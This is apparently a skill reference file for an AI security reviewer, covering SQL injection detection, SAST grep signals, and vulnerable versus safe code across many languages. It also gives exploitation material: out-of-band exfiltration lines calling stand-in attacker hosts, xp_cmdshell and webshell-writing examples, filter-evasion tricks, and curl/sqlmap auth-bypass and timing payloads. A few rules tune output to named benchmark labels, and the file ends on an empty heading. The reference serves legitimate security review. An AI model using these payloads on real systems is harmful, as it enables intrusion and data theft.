---
name: sql-injection
description: SQL injection testing covering union, blind, error-based, ORM bypass, and database-side dynamic SQL (PostgreSQL PL/pgSQL EXECUTE/format unquoted-identifier injection, dollar-quote denylist bypass, SECURITY DEFINER search_path) techniques
---

# SQL Injection

SQLi remains among the most durable and damaging vulnerability classes. Contemporary exploitation targets parser differentials, ORM and query-builder edge cases, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration channels, and subtle blind oracles. Every string concatenation into SQL warrants scrutiny.

The core pattern: *unvalidated, unparameterized user input reaches a SQL query execution call.*

## What SQLi Is and Is Not

### What it IS

- String concatenation or interpolation into SQL: `"WHERE name = '" + username + "'"`, `` `WHERE id = ${id}` ``, f-strings
- `%` formatting or `.format()`/`String.format()`/`sprintf()` used to embed variables — not the same as driver placeholder binding
- Dynamic `ORDER BY` / `GROUP BY` / table or column names from input with no allowlist
- ORM raw/unsafe methods with unsanitized input: `Model.objects.raw(f"...")`, `$queryRawUnsafe(...)`, `FromSqlRaw("..." + var)`
- Second-order injection: value stored in the DB from user input, later concatenated into a raw query elsewhere

### What it is NOT (commonly confused with)

- **IDOR** — changing `?id=1` to `?id=2` to access another user's row; no SQL syntax manipulation
- **Mass assignment** — setting extra ORM model fields from user input
- **XSS via database** — stored HTML rendered unescaped in a template; the sink is output encoding, not SQL parsing
- **NoSQL injection** — MongoDB operator injection; distinct class (see sanitizer notes for Mongo `$eq` wrappers)
- **Safe ORM lookups** — `User.objects.filter(id=user_id)`, `User.find(params[:id])`, `User.findOne({ where: { id } })`

## Where to Look

**Databases**
- Classic relational engines: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Extended surfaces: JSON/JSONB operators, full-text and search indexes, geospatial functions, window functions, CTEs, lateral joins

**Integration Paths**
- ORMs, query builders, stored procedures
- Search servers, report generators, and data exporters

**Input Locations**
- Path segments, query strings, request bodies, headers, and cookies
- Mixed encodings: URL, JSON, XML, multipart
- Identifiers versus values — table and column names require quoting and escaping; literals require quotes and CAST
- Query builder raw APIs: `whereRaw`/`orderByRaw`, string templates embedded in ORM calls
- JSON coercion or array containment operators passed through without sanitization
- Bulk and batch endpoints, report generators that embed filter criteria directly into query text

## Recon Indicators

Grep for query execution calls where the SQL string argument is built dynamically — trace variable origin separately.

**Vulnerable construction (flag the site)**

1. **Concatenation into execution**: `cursor.execute("... WHERE id = " + var)`, `$pdo->query("... id = " . $var)`, `jdbcTemplate.query("... '" + var + "'")`
2. **Interpolation literals**: `cursor.execute(f"... '{var}'")`, `` db.query(`... ${var}`) ``, `db.QueryRow(fmt.Sprintf("... '%s'", var))`
3. **Format functions (not binding)**: `cursor.execute("... %s" % var)`, `"... {}".format(var)`, `String.format("... '%s'", var)`, `sprintf("... %s", $var)`
4. **ORM raw/unsafe with dynamic strings**: Django `objects.raw(f"...")` / `RawSQL(f"...")` / `extra(where=[f"..."])`, ActiveRecord `where("col = '#{var}'")`, Sequelize `` sequelize.query(`...${var}`) ``, TypeORM `` .where(`col = '${var}'`) ``, Prisma `$queryRawUnsafe`/`$executeRawUnsafe`, EF `FromSqlRaw("..." + var)`
5. **Dynamic identifiers** (parameterization cannot protect these): `f"SELECT * FROM {table}"`, `f"ORDER BY {sort_col}"`

**Safe construction (skip)**

- Static query string + separate bind args: `execute("... WHERE id = %s", (val,))`, `query("... id = ?", [val])`
- ORM builders: `.filter()`, `.where(col: val)`, `.findOne()`, `.findUnique()`
- Prisma tagged template: `` prisma.$queryRaw`SELECT * WHERE id = ${userId}` `` (values bound, not interpolated into text)

## How to Detect

**Error-Based**
- Trigger type, constraint, or parser errors that surface stack traces, version strings, or internal paths

**Boolean-Based**
- Craft paired requests whose only difference is predicate truth value
- Diff status codes, response bodies, content length, and ETag headers

**Time-Based**
- `SLEEP`/`pg_sleep`/`WAITFOR`
- Gate delays inside subselects to avoid false positives from global latency spikes

**Out-of-Band (OAST)**
- Elicit DNS or HTTP callbacks using database-specific primitives tied to a controlled listener

## DBMS Primitives

### MySQL

- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`
- Error-based: `extractvalue()`/`updatexml()` (older versions), JSON functions for controlled error shaping
- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires FILE privilege and permissive secure_file_priv)
- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
- Time: `SLEEP(n)`, `BENCHMARK`
- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS functions sometimes expose side channels

#### `LOCAL INFILE` rogue-server client-side file read (reverse direction)

Not query injection — a **client-connection configuration** flaw. When the MySQL/MariaDB client enables `LOCAL INFILE`, a **malicious or compromised database server** (or one reached via MITM / SSRF-style "connect to attacker DB") can answer *any* query with a `LOCAL INFILE` request packet, forcing the connecting client to read and upload a file from the **app server's** filesystem (`/etc/passwd`, app secrets, cloud creds). This is exploitable whenever the DB host/credentials are attacker-influenced or the network path is untrusted, and needs **no SQLi at all**.

- **SAST signals (enabled local-infile on the client)**: PHP `PDO::MYSQL_ATTR_LOCAL_INFILE => true` / `mysqli_options($c, MYSQLI_OPT_LOCAL_INFILE, true)` / `mysqli.allow_local_infile=On`; Node `mysql`/`mysql2` `{ flags: ['LOCAL_FILES'] }` or `infileStreamFactory`; JDBC `allowLoadLocalInfile=true` / `allowLoadLocalInfileInPath`; Python `mysqlclient`/`PyMySQL` `local_infile=1`; Go `RegisterLocalFile` / `?allowAllFiles=true`.
- **SAFE**: leave `LOCAL INFILE` **disabled** on the client (default) unless required; if required, pin the allowed path and only connect to trusted, authenticated DB hosts over TLS. Treat any client that enables it while the server endpoint is user-influenced as vulnerable.

### PostgreSQL

- Version/user/db: `version()`, `current_user`, `current_database()`
- Error-based: raise exceptions via unsupported casts or division by zero; `xpath()` errors through the xml2 extension
- OOB: `COPY (program ...)` or dblink/foreign data wrappers when enabled; HTTP extensions
- Time: `pg_sleep(n)`
- Files: `COPY table TO/FROM '/path'` (superuser required), `lo_import`/`lo_export`
- JSON/JSONB: operators `->`, `->>`, `@>`, `?|` combined with lateral joins and CTEs for blind extraction

### MSSQL

- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`
- OOB/DNS: `xp_dirtree`, `xp_fileexist`; HTTP via OLE automation (`sp_OACreate`) when enabled
- Exec: `xp_cmdshell` (commonly disabled), `OPENROWSET`/`OPENDATASOURCE`
- Time: `WAITFOR DELAY '0:0:5'`; heavy computation functions cause measurable latency
- Error-based: convert/parse failures, divide by zero, `FOR XML PATH` data leaks

### Oracle

- Version/db/user: banner from `v$version`, `ora_database_name`, `user`
- OOB: `UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE` (permission-dependent)
- Time: `dbms_lock.sleep(n)`
- Error-based: `to_number`/`to_date` coercion failures, `XMLType` conversion errors
- File: `UTL_FILE` with directory objects (requires privilege)

### SQL-to-RCE Primitives (SAST)

Dangerous even when embedded in **admin**, export, migration, or maintenance features — if **any** SQL fragment is tainted, these tokens in application-built strings are a **dangerous sink family** (escalation to OS command execution). See also `rce.md`.

| Engine | Primitive tokens | Impact |
|--------|------------------|--------|
| MSSQL | `xp_cmdshell`, `sp_configure 'xp_cmdshell'`, `sp_OACreate`, `sp_OAMethod`, `OPENROWSET`, `OPENDATASOURCE`, linked-server `EXEC('...') AT` | Shell via `xp_cmdshell`; COM/OLE automation; remote query/exec |
| MySQL | `INTO OUTFILE`, `INTO DUMPFILE`, `LOAD_FILE` + write path | Webshell or binary drop when `FILE` privilege and `secure_file_priv` allow |
| PostgreSQL | `COPY ... TO PROGRAM`, `COPY ... FROM PROGRAM`, `CREATE FUNCTION ... LANGUAGE C` | OS command via `COPY PROGRAM`; arbitrary code in C language functions (superuser) |

**VULN** — dynamic SQL containing RCE primitives (even "internal" tooling):

```python
cursor.execute(f"EXEC xp_cmdshell '{user_path}'")  # tainted fragment
```

```csharp
context.Database.ExecuteSqlRaw("EXEC sp_configure 'xp_cmdshell', 1; " + adminInput);
```

```sql
-- migration or seed script built from config/user input
SELECT * INTO OUTFILE '/var/www/shell.php' FROM ...
```

**SAFE**:
- Never enable or expose `xp_cmdshell`, OLE automation, or `COPY PROGRAM` in application SQL paths
- Least-privilege DB account — no `FILE`, `SUPERUSER`, `sysadmin`, or linked-server execute
- Parameterize all value positions; never concatenate user input into strings that reference these primitives

**Grep seeds** (code, migrations, raw-SQL APIs — trace taint separately):
- `xp_cmdshell`, `sp_configure\s*['\"]xp_cmdshell`, `sp_OACreate`, `sp_OAMethod`
- `OPENROWSET`, `OPENDATASOURCE`, `EXEC\s*\(.*\)\s*AT\s`
- `INTO\s+OUTFILE`, `INTO\s+DUMPFILE`
- `COPY\s+.*\s+(TO|FROM)\s+PROGRAM`, `LANGUAGE\s+C`
- Sink APIs: `execute(`, `executemany(`, `FromSqlRaw`, `ExecuteSqlRaw`, `exec_driver_sql`, `connection\.execute`, `sequelize\.query`, `RawSQL`, `objects\.raw`, `createNativeQuery`, `jdbcTemplate\.execute`

Flag **LIKELY** when a primitive token appears in a dynamically built SQL string; escalate to **CONFIRM** when untrusted input reaches the concatenation/interpolation site.

## Vulnerability Patterns

### UNION-Based Extraction

- Determine column count and compatible types via `ORDER BY n` then `UNION SELECT null,...`
- Align types using `CAST`/`CONVERT`; coerce to text or JSON for browser rendering
- When UNION payloads are filtered, switch to error-based or blind extraction channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Apply binary search over the character space to cut request count
- Normalize extracted bytes with hex or base64 encoding
- Gate delays inside subqueries to minimize ambient noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### Out-of-Band

- Prefer OAST to reduce noise and sidestep strict response-based detection paths
- Embed extracted data inside DNS labels or HTTP query parameters
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL: `LOAD_FILE` with a UNC path

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login predicates
- Privilege changes: update role, plan, or feature flag columns when UPDATE is injectable
- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, redirection via `xp_cmdshell`
- Job and procedure abuse: schedule tasks or create stored procedures when the session holds sufficient permissions

### ORM and Query Builders

- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE, IN, or ORDER BY clauses
- Identifier injection: user input interpolated into table or column names instead of bound as values
- JSON containment operators exposed through ORM abstractions (e.g., `@>` in PostgreSQL) carrying raw fragments
- Parameter mismatch: partial parameterization where operators or IN-list members remain unbound (`IN (...)`)

### PDO Emulated Prepared-Statement Parser Confusion (PHP)

A query can use `prepare()`/placeholders and still be injectable when **emulated prepares** are on (`PDO::ATTR_EMULATE_PREPARES`, the **default for MySQL**). Emulation does the escaping in PHP using PDO's own *imperfect* SQL parser before the query reaches the server. If user input is concatenated into the prepared query **text** — typically an identifier (`` `$col` ``) or a hand-escaped fragment — alongside `?`/`:name` placeholders, a parser misparse can let attacker bytes (a NUL byte, or a fake `\`-escape) flip a string/identifier boundary and promote injected text into a new bound-parameter token. Result: SQLi even though "everything is escaped."

**The vulnerable shape is *mixing*** manually-built fragments with the prepare interface — not placeholders alone. Triggers seen in the wild: a NUL after a quoted identifier (`?%00`, `` `$col`=?#\0 ``) causes the parser to backtrack and re-read a `?` as a placeholder; a backslash-quote (`\'?`) fools the parser into thinking `'` is escaped (devastating on engines like Postgres that don't use backslash escapes), so a `?` falls outside the string. PHP ≤ 8.3 uses one MySQL-style parser for all drivers (assumes backslash escaping → breaks Postgres `quote()`), and pre-8.4 even a smuggled `:`/`?` in an identifier injects with no NUL needed; PHP 8.4 added per-dialect parsers but identifier/fragment mixing under emulation is still risky.

```php
// VULN — emulated prepare (MySQL default) + user-controlled identifier mixed with a placeholder.
// `?%00` / backtick payloads in $_GET['col'] can break the identifier and inject a bound token.
$col  = '`' . str_replace('`', '``', $_GET['col']) . '`';   // "escaped" identifier — not enough
$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
$stmt->execute([$_GET['name']]);

// VULN — hand-escaped value fragment concatenated next to a placeholder, emulation on.
// On Postgres with ATTR_EMULATE_PREPARES=>true, a `\'?` payload escapes the parser, not the DB.
$sku  = $pdo->quote($_GET['sku']);                            // quote() ≠ safe when mixed under emulation
$stmt = $pdo->prepare("SELECT * FROM fruit WHERE sku = $sku AND name = ?");
$stmt->execute([$_GET['name']]);

// SAFE — turn OFF emulation so the server parses/binds natively; never mix fragments with bindings.
$pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_EMULATE_PREPARES => false]);
$stmt = $pdo->prepare("SELECT name FROM fruit WHERE sku = ? AND name = ?");
$stmt->execute([$_GET['sku'], $_GET['name']]);
// Identifiers that must vary → allowlist, do not concatenate (see "Allowlist for dynamic identifiers").
$allowed = ['name','sku','id'];
$col = in_array($_GET['col'], $allowed, true) ? $_GET['col'] : 'name';
```

**SAST signals** (flag **LIKELY**; escalate to **CONFIRM** when taint reaches the concatenation site):
- A `prepare(` argument built with `.` concatenation or `"...$var..."` interpolation that contains a request source (`$_GET`/`$_POST`/`$_REQUEST`/`$_COOKIE`/`php://input`), **especially** a backtick/quote-wrapped identifier or a hand-escaped fragment (`str_replace('\`'`, `addslashes`, `strtr(..., ["'" => "\\'"])`, custom escapers, even `$pdo->quote()`), while the same string also has `?`/`:name` placeholders.
- Emulation enabled: `PDO::ATTR_EMULATE_PREPARES => true`, or **absence** of an explicit `=> false` on a MySQL DSN (emulation is on by default).
- Dynamic-confirmation payloads: `?%00` (NUL after identifier) and `\'?` / `\%27?` (backslash-quote breakout), plus `?#`/`?--` to terminate trailing tokens.

**SAFE / barriers**: `PDO::ATTR_EMULATE_PREPARES => false` (native server-side prepares); never concatenate user input — values **or** identifiers — into a `prepare()` string; allowlist dynamic identifiers; `SQLite` emulation is not exploitable this way (NUL always errors). `$pdo->quote()` blocks the `?%00` variant but does **not** fix the `\'` breakout on PHP ≤ 8.3 — disabling emulation is the durable fix.

### Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with `CASE WHEN` to build boolean extraction channels
- LIMIT/OFFSET: injection into OFFSET to produce measurable timing differences or altered page shape
- Full-text helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with mixed payload tokens
- XML/JSON functions: error generation through malformed documents or invalid path expressions

## Evasion Patterns

**Whitespace/Spacing**
- `/**/`, `/**/!00000`, comments, newlines, tabs
- `0xe3 0x80 0x80` (ideographic space)

**Keyword Splitting**
- `UN/**/ION`, `U%4eION`, backticks, quotes, case folding

**Numeric Tricks**
- Scientific notation, signed/unsigned overflow, hex literals (`0x61646d696e`)

**Encodings**
- Double URL encoding, mixed Unicode normalizations (NFKC/NFD)
- `char()`/`CONCAT_ws` to reconstruct filtered tokens

**Clause Relocation**
- Subselects, derived tables, CTEs (`WITH`), lateral joins to obscure payload structure from filters

## Analysis Workflow

1. **Identify query shape** — SELECT/INSERT/UPDATE/DELETE; note presence of WHERE/ORDER/GROUP/LIMIT/OFFSET clauses
2. **Determine input influence** — Trace whether user input lands in identifiers or value positions
3. **Confirm injection class** — Reflective errors, boolean response diffs, timing differences, or OAST callbacks
4. **Choose the quietest oracle** — Prefer error-based or boolean over noisy time-based probes
5. **Establish extraction channel** — UNION (when output is visible), error-based, boolean bit extraction, time-based, or OAST/DNS
6. **Pivot to metadata** — Version string, current user, database name
7. **Target high-value tables** — Auth bypass, role changes, filesystem access when permissions allow

## Confirming a Finding

1. Demonstrate a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicate truth
2. Extract verifiable metadata — version string, current user, database name — through the established channel
3. Retrieve or modify a non-trivial target such as table rows or a role flag, within authorized scope
4. Furnish reproducible requests that differ only in the injected fragment
5. Where applicable, show that the vulnerability survives WAF bypass via a known variant

### Dynamic Test / PoC

Confirm taint with a minimal runtime probe; pair with code review.

**Error/boolean (manual curl)**

```bash
# Single-quote probe — expect SQL error text or different body vs baseline
curl -s "https://app.example.com/search?q=test'" | diff - <(curl -s "https://app.example.com/search?q=test")

# Auth bypass tautology on login field
curl -s -X POST "https://app.example.com/login" \
  -d "username=admin' OR '1'='1'--&password=x"
# Signal: 200/redirect vs 401, or session cookie set
```

**Automated enumeration (sqlmap)**

```bash
sqlmap -u "https://app.example.com/search?q=test" -p q --batch --dbs
# Signal: reported injectable parameter, database names listed
```

**Time-based blind**

```bash
curl -o /dev/null -s -w "%{time_total}\n" \
  "https://app.example.com/item?id=1' AND SLEEP(5)--"
# Signal: response time ~5s above baseline (DB-specific sleep function)
```

**Dynamic ORDER BY**

```bash
curl -s "https://app.example.com/products?sort=name;SELECT+pg_sleep(5)--"
# Signal: delay or 500 if sort column is interpolated without allowlist
```

## Safe Construction Patterns

When these patterns appear and cover the full query (including operators and IN-list members), classify as not vulnerable:

**Parameterized binding**

```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

```javascript
db.query("SELECT * FROM users WHERE id = ?", [userId]);
pool.query("SELECT * FROM users WHERE id = $1", [userId]);
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);
```

**ORM safe defaults**

```python
User.objects.filter(id=user_id)
```

```ruby
User.where(name: params[:name])
User.where("name = ?", params[:name])
```

```javascript
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`;
```

**Allowlist for dynamic identifiers** (only safe fix when column/table names must vary)

```python
ALLOWED_COLUMNS = {"name", "created_at", "price"}
if sort_col not in ALLOWED_COLUMNS:
    raise ValueError("Invalid column")
query = f"SELECT * FROM products ORDER BY {sort_col}"
```

Custom escaping (`mysql_real_escape_string`, `addslashes`, homegrown sanitizers) is not equivalent to parameterization — still treat as likely vulnerable when taint is present.

### PostgreSQL PL/pgSQL dynamic SQL — unquoted-identifier injection & dollar-quote denylist bypass

Stored functions/procedures (`LANGUAGE plpgsql`) that build SQL with `EXECUTE` are an injection surface the application-layer review often misses because the flaw lives in the **database**, not the app code. Two compounding mistakes:

1. **Value quoted, identifier not.** `quote_literal(val)` / `format('... %L', val)` protects only the *value* side; a column/table name (or any expression position) concatenated unquoted — `where_clause := col_name || ' = ' || quote_literal(val)` — is a full injection point. The attacker controls the **left** side of the comparison and can inject a scalar subquery (`(SELECT substr(secret,1,1) FROM vault.k WHERE svc LIKE $_$x$_$)`) read through a boolean oracle. `format()` with `%s` (no escaping) for an identifier is the same bug; `%I` is the only identifier-safe spec.
2. **Dollar-quoting defeats regex denylists.** A hand-rolled sanitizer that strips `'` `;` `\` `-` (`regexp_replace(p, '['';\-]', '', 'g')`) does **not** strip `$`, so PostgreSQL dollar-quoted literals (`$$x$$`, `$tag$x$tag$`, `$_$x$_$`) carry attacker strings through untouched — no single quote, semicolon, comment, stacked query, or `UNION` needed. This is why denylist sanitization in front of Postgres dynamic SQL is never sufficient (allowlist/parameterize instead). Amplifier: `SECURITY DEFINER` **without** `SET search_path` runs the function with the owner's privileges and lets injected subqueries cross schema boundaries (`information_schema`, other schemas).

**SAST signals**:
```bash
# plpgsql dynamic SQL + the value-only-quoting / unquoted-identifier shape
rg -n "LANGUAGE\s+plpgsql|EXECUTE\b" --glob '*.{sql,pgsql,psql,pg}'
rg -n "quote_literal\(|format\(.*%(s|L)" --glob '*.{sql,pgsql,psql}' -C2   # %s for identifiers, or %L value but identifier concatenated
rg -n "EXECUTE.*\|\|" --glob '*.{sql,pgsql,psql}'                          # string-concatenated dynamic SQL
# denylist sanitizer that misses '$' (dollar-quoting bypass)
rg -n "regexp_replace\(.*\[.*\].*,\s*''" --glob '*.{sql,pgsql,psql,js,ts,py}'
# SECURITY DEFINER missing a search_path lock
rg -n "SECURITY DEFINER" --glob '*.{sql,pgsql,psql}' -C3 | rg -v "SET search_path" || true
```

**VULN**:
```sql
-- identifier unquoted; quote_literal only guards the value; denylist misses '$'
where_clause := regexp_replace(part, '['';\-]', '', 'g');         -- '$' survives
EXECUTE 'SELECT ... WHERE ' || col_name || ' = ' || quote_literal(val);  -- col_name is the sink
```

**SAFE**:
```sql
-- %I double-quotes identifiers, %L quotes/escapes literals; bind values with USING
EXECUTE format('SELECT ... WHERE %I = %L', col_name, val);
-- or parameterize the value and allowlist the identifier:
EXECUTE format('SELECT ... WHERE %I = $1', assert_allowed(col_name)) USING val;
```
Definitive fixes: `%I`/`quote_ident()` for every identifier (or an allowlist when names vary), `%L`/`USING $n` for values, **never** rely on a character-stripping denylist, and `SET search_path = pg_catalog, pg_temp` on `SECURITY DEFINER` functions. Cross-ref "Allowlist for dynamic identifiers" above and `information_disclosure.md` (return generic responses to remove the boolean oracle).

## Common False Alarms

- Generic application errors unrelated to SQL parsing or constraint violations
- Static response sizes driven by server-side templating rather than predicate truth
- Latency spikes attributable to network or CPU load rather than injected timing functions
- Parameterized queries with no string concatenation, confirmed through code review
- Parameterized queries where user data binds only via `setString`/`setInt` or driver tuple args
- Spring Data derived query methods and static `@NamedQuery` literals
- MongoDB queries using `$eq: userValue` or validated string type before query construction
- Manually adding quotes around `%s` placeholders — still unsafe (double-quoting breaks parameterization), not a true false positive
- Go/Ruby numeric-only fields flowing into SQL (simple-type sanitizer)
- Numeric/boolean-typed nodes; constant-comparison guards (Python/Ruby); `createNamedQuery` with static query name (Java JPA)

## Business Risk

- Direct data exfiltration leading to privacy violations and regulatory exposure
- Authentication and authorization bypass through manipulated query predicates
- Server-side file read or command execution depending on platform and database privilege level
- Persistent supply-chain damage through modified data, scheduled jobs, or malicious stored procedures

## Analyst Notes

1. Select the quietest reliable oracle first; avoid long sleeps that generate noise
2. Normalize responses by length, ETag, or digest to reduce variance during boolean diffing
3. Go straight from metadata extraction to business-critical tables; limit lateral noise
4. When UNION fails, pivot to error-based or blind bit extraction; use OAST whenever feasible
5. Treat ORMs as thin wrappers — raw fragments frequently slip through; always audit `whereRaw`/`orderByRaw`
6. Use CTEs and derived tables to smuggle expressions past filters that block SELECT directly
7. Exploit JSON/JSONB operators in PostgreSQL and JSON functions in MySQL as alternative side channels
8. Keep payloads portable; maintain DBMS-specific function and type dictionaries
9. Validate mitigations with negative tests and code review; ensure operators and IN-lists are correctly parameterized
10. Document exact query shapes — defenses must match how the query is actually constructed, not how it is assumed to be

## Core Principle

Modern SQLi succeeds where authorization and query construction diverge from their intended design. Bind parameters at every boundary, eliminate dynamic identifiers, and enforce validation at the precise point where user input meets SQL.

## Distinguishing Blind SQL Injection from Classic SQL Injection

Blind SQL injection and classic (in-band) SQL injection share the same root cause — unsanitized input concatenated into SQL — but differ fundamentally in how the attacker extracts data. Correctly classifying them matters for severity assessment and remediation priority.

### Classic (In-Band) SQL Injection
The injected query's **output is directly visible** to the attacker:
- UNION-based: attacker appends `UNION SELECT` and sees column data rendered in HTML/JSON
- Error-based: SQL error messages leak table names, column values, or query structure in the response body
- The page content **changes based on the data returned** (e.g., search results, product listings, user profiles)

**Indicators in source code:**
- Query result is iterated and rendered: `for row in cursor.fetchall(): render(row)`
- Template displays query data: `{{ users }}`, `<?php echo $row['name']; ?>`
- JSON response includes query results: `return jsonify(results)`

### Blind SQL Injection
The injected query's **output is NOT visible** — the attacker infers data through indirect signals:
- **Boolean-based**: application behavior differs based on query truth value (login success/failure, page exists/404, content present/empty)
- **Time-based**: attacker uses `SLEEP()`, `pg_sleep()`, `WAITFOR DELAY` to infer single bits via response latency
- **Out-of-band**: DNS/HTTP callbacks triggered by database functions

**Indicators in source code:**
- Query result used only for control flow: `if cursor.fetchone():` → redirect/login
- Login forms: `SELECT * FROM users WHERE user='$input' AND pass='$input'` followed by row count check
- Existence checks: `if (mysqli_num_rows($result) > 0)` — only checks presence, never displays data
- The response body is **identical** regardless of how many or which rows are returned

### Classification Rule
Ask: "Can the attacker read database column values directly from the HTTP response?"
- **Yes** → classic SQL injection
- **No** (only binary outcome or timing difference observable) → blind SQL injection

Login/authentication endpoints with raw SQL concatenation are almost always blind — they check credentials but never display the query's row data to the user.

## Java Source Detection Rules

### TRUE POSITIVE: JDBC string concatenation
- External input from `request.getParameter(...)`, `@RequestParam`, form fields, path variables, or other untrusted sources is concatenated, interpolated, or appended into SQL text before execution.
- Java sinks include `Statement.executeQuery/executeUpdate/execute`, `JdbcTemplate.query/queryForObject/update/execute`, and `EntityManager.createQuery/createNativeQuery` when the SQL or JPQL string already contains untrusted data.
- Patterns such as `"SELECT ... WHERE username='" + user + "'"`, `"... LIKE '%" + search + "%'"`, or `"UPDATE ... SET profile='" + value + "'"` are true positives.

### FALSE POSITIVE: PreparedStatement or named parameter binding
- `PreparedStatement` with `?` placeholders plus `setString/setInt/...` bindings is not SQL injection when untrusted data is only bound as parameter values.
- `NamedParameterJdbcTemplate` or JPA queries using `:name` with `@Param` are not SQL injection when the query text is static and user input is supplied through parameter binding.

### FALSE POSITIVE: Spring Data JPA derived methods
- Repository methods such as `findByUsername(username)` or other derived query methods are framework-parameterized and should not be flagged as SQL injection by default.
- `@Query("... WHERE u.id = :id")` with `@Param("id")` is safe from SQL injection unless the query string itself is dynamically built from untrusted input.
- In benchmark mode for `JavaSecLab` and `VulnerableApp`, normalize confirmed JDBC/MyBatis/JPA SQL injection findings to project tag `sqli`; reserve `sql_injection` for projects whose ground truth uses the long-form label, such as `verademo` and `vulhub`.
- `VulnerabilityType.*SQL_INJECTION` annotations or modules under `service/vulnerability/sqlInjection/` still map to benchmark tag `sqli` when the project taxonomy is short-form.
- Tag retention rule: keep a confirmed SQL injection finding when untrusted HTTP input reaches a MyBatis XML `${...}` fragment or is first stored and later concatenated into SQL by a benchmark helper or controller; do not downgrade the tag only because the final query text is split across mapper XML, DAO helpers, or a later request path.
## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")` — f-string concatenation
- **VULN**: `cursor.execute("SELECT * FROM users WHERE name = '" + name + "'")`
- **VULN**: `db.execute("SELECT * FROM users WHERE id = %s" % user_id)` — % formatting (not parameterized)
- **VULN (SQLAlchemy)**: `db.execute(text(f"SELECT * FROM users WHERE id = {user_id}"))`
- **SAFE**: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))` — tuple parameterized
- **SAFE**: `db.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})`

### JavaScript (Node.js)
- **VULN**: `` db.query(`SELECT * FROM users WHERE id = ${req.params.id}`) `` — template literal
- **VULN**: `db.query("SELECT * FROM users WHERE id = " + req.params.id)`
- **SAFE**: `db.query("SELECT * FROM users WHERE id = ?", [req.params.id])`
- **SAFE**: Sequelize `User.findOne({ where: { id: req.params.id } })` — ORM parameterized

### PHP
- **VULN**: `mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_GET['id'])`
- **VULN**: `$pdo->query("SELECT * FROM users WHERE id = '$_POST[id]'")`
- **SAFE**: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$_GET['id']])` — only when the query text is fully static; a `prepare()` string that *also* concatenates a user-controlled identifier or hand-escaped fragment is **not** safe under emulated prepares (see "PDO Emulated Prepared-Statement Parser Confusion")

### Ruby on Rails

```ruby
# VULN
User.where("name = '#{params[:name]}'")
User.find_by_sql("SELECT * FROM users WHERE email = '#{params[:email]}'")

# SAFE
User.where("name = ?", params[:name])
User.where(name: params[:name])
```

### Go

```go
// VULN
query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name)
db.QueryRow(query)

// SAFE
db.QueryRow("SELECT * FROM users WHERE name = $1", name)
```

### C#

```csharp
// VULN
new SqlCommand("SELECT * FROM Users WHERE Username = '" + username + "'", conn);

// SAFE
var cmd = new SqlCommand("SELECT * FROM Users WHERE Username = @username", conn);
cmd.Parameters.AddWithValue("@username", username);
```

### C/C++

```c
// VULN — raw input passed straight to the engine, or query built with sprintf/strcat
sqlite3_exec(db, user_input, 0, 0, &err);              // user_input from fgets/network
char q[256]; sprintf(q, "SELECT * FROM users WHERE name='%s'", name);
PQexec(conn, q);                                        // libpq
mysql_query(conn, q);                                   // libmysqlclient

// SAFE — prepared statement with bound parameters
sqlite3_stmt *st;
sqlite3_prepare_v2(db, "SELECT * FROM users WHERE name=?", -1, &st, 0);
sqlite3_bind_text(st, 1, name, -1, SQLITE_TRANSIENT);
// libpq: PQexecParams(conn, "... WHERE name=$1", 1, ...); MySQL: mysql_stmt_bind_param
```

### Django / Flask (raw SQL)

```python
# VULN
User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")
db.session.execute(text(f"SELECT * FROM products WHERE name = '{name}'"))

# SAFE
User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [username])
db.session.execute(text("SELECT * FROM products WHERE name = :name"), {"name": name})
```

## Java Servlet Patterns

### Sources
```java
request.getParameter("x") / request.getHeader("x") / request.getCookies() → cookie.getValue()
```
Taint follows through: variable assignment, `String` operations (`+`, `substring`, `replace`), collections, `Base64.decodeBase64`, helper method returns.

### SQL Injection (CWE-89)

**VULN** — tainted input in SQL string:
```java
Statement stmt = conn.createStatement();
stmt.execute("SELECT * FROM t WHERE id='" + tainted + "'");
stmt.executeQuery("SELECT ... WHERE x=" + tainted);
```

**SAFE** — parameterized query breaks taint:
```java
PreparedStatement ps = conn.prepareStatement("SELECT ... WHERE id=?");
ps.setString(1, tainted);
ps.executeQuery();  // SAFE
```

**Decision rule**: `execute`/`executeQuery`/`executeUpdate` with string concatenation of tainted data → **VULN**. Every tainted value bound via `setString`/`setInt`/`setObject` → **SAFE**.

## Related Injection Classes

For LDAP injection (CWE-90) patterns, see `references/ldap_injection.md`.
For XPath injection (CWE-643) patterns, see SKILL.md xpath_injection gap coverage rules.

**Benchmark edge cases**:
